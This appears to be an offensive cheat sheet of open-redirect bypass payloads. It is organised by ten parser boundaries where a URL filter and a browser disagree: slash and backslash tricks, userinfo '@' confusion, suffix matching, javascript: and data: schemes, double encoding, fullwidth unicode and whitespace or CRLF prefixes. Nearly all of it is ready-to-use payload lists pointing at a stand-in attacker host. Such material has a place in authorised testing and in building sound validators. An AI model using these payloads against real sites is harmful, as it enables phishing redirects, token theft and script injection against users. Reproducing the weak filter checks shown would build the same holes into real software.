# Per-boundary — each parser boundary and the arm that crosses it

## Boundary 1 — the `/` vs `//` boundary

```text
the filter:  startswith('/')   -> 'internal path'
the browser: startsWith('/') -> a path on the ORIGIN
             startsWith('//')-> a scheme-relative -> host=evil.com
the gap:     //evil.com passes the startswith('/') (it DOES start /)
             but the browser resolves it scheme-relative
the arm:     //evil.com, ///evil.com, ////evil.com, //%65vil.com
```

## Boundary 2 — the `/` vs `\` boundary

```text
the filter:  startswith('/') rejects '\\' — treats '\' as a path-char
the browser: the '\' is a PATH SEPARATOR -> /\evil.com -> //evil.com
the gap:     /\evil.com — starts '/', contains '\'; the filter passes it
             as a relative path; the browser normalizes '\'->'/' -> //evil.com
the arm:     /\evil.com, \\evil.com, /%5cevil.com, %5cevil.com,
             /\/evil.com, /\\evil.com, /\%2fevil.com
```

## Boundary 3 — the `userinfo@` boundary

```text
the filter:  urlparse(...).netloc == 'target.com'  OR 'target.com' in url
             -> reads the netloc STRING or the substring
the browser: the host is AFTER the last '@' -> https://target.com@evil.com
             -> host=evil.com
the gap:     the filter sees 'target.com' substring/netloc; the browser
             reads host=evil.com
the arm:     https://target.com@evil.com, https://target.com:443@evil.com,
             https://target.com.%40evil.com
```

## Boundary 4 — the `\@` boundary

```text
the filter:  urlparse('https://evil.com\\@target.com') — the `\@` is in
             the netloc/path differently than the browser reads it
the browser: the '\' is a path-sep -> host=target.com? or the '@' splits
             differently
the gap:     the parser-disagreement on `\@`
the arm:     https://evil.com\@target.com, https://evil.com%5c@target.com,
             https://evil.com%5c%40target.com
```

## Boundary 5 — the `.` suffix boundary

```text
the filter:  endswith('target.com') / contains('target.com')
             -> the suffix/substring string-match
the browser: the host is the parsed token — 'target.com.evil.com' is a
             SUBDOMAIN of evil.com; 'eviltarget.com' is a different host
the gap:     the string-match misses the host-boundary
the arm:     https://target.com.evil.com, https://eviltarget.com,
             https://target-com.evil.com, https://x.target.com.evil.com
```

## Boundary 6 — the scheme boundary

```text
the filter:  scheme in [http,https] / no '://'
the browser: javascript:/data:/file:/about: are resolvable schemes
the gap:     a non-http(s) scheme the filter misses
the arm:     javascript:alert(1), data:text/html,<script>, file:///...,
             vbscript:..., intent://..., about:blank
```

## Boundary 7 — the decode-order boundary

```text
the filter:  checks the param AT one decode stage
the browser: resolves the URL at a DIFFERENT decode stage
the gap:     %2f%2f -> //, %5c -> \, %253a -> %3a -> : — the double-decode
the arm:     https%3a%2f%2fevil.com, %2f%2fevil.com, %5cevil.com,
             https%253a%252f%252fevil.com (double), %255cevil.com
```

## Boundary 8 — the unicode boundary

```text
the filter:  checks ASCII; the browser decodes a fullwidth/multi-byte
the gap:     %ef%bc%8f = ／ (fullwidth /), %ef%bc%a0 = ＠ (fullwidth @)
the arm:     https:%ef%bc%8f%ef%bc%8fevil.com,
             https://evil%ef%bc%8ecom,
             https://evil%ef%bc%a0target.com,
             evil%E3%80%82com (the ideographic 。)
```

## Boundary 9 — the whitespace/control boundary

```text
the filter:  a trim-gap / a control-char check
the browser: trims/normalizes the whitespace
the arm:     %20https://evil.com, %09https://evil.com, %0ahttps://evil.com,
             https://evil.com%20, %0d%0ahttps://evil.com (the CRLF twin)
```

## Boundary 10 — the authority/port boundary

```text
the filter:  a hostname-read that includes the port/userinfo
the browser: the hostname strips the port; the userinfo strips the '@'
the arm:     https://target.com:443@evil.com, https://evil.com:443@target.com,
             https://target.com., https://target.com%2e
```

## The boundary-record

`boundary: <the-parse-boundary>: <the-filter-read>: <the-browser-read>: <the-arm>`
